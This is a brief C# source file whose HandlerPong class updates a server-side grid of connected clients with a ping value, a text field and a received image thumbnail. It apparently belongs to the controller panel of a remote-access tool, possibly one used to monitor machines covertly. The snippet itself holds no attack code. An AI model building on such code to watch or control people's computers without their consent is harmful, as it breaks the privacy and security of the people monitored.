using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connectings;

namespace Server.Messages;

internal class HandlerPong
{
	public static void Read(Clients client, object[] objects)
	{
		if (client.Tag == null)
		{
			client.Disconnect();
			return;
		}
		client.lastPing.Last();
		DataGridViewRow dataGridViewRow = (DataGridViewRow)client.Tag;
		dataGridViewRow.Cells[15].Value = (int)objects[1];
		if (objects.Length <= 2)
		{
			return;
		}
		dataGridViewRow.Cells[16].Value = (string)objects[2];
		using MemoryStream stream = new MemoryStream((byte[])objects[3]);
		dataGridViewRow.Cells[0].Value = new Bitmap(stream);
	}
}
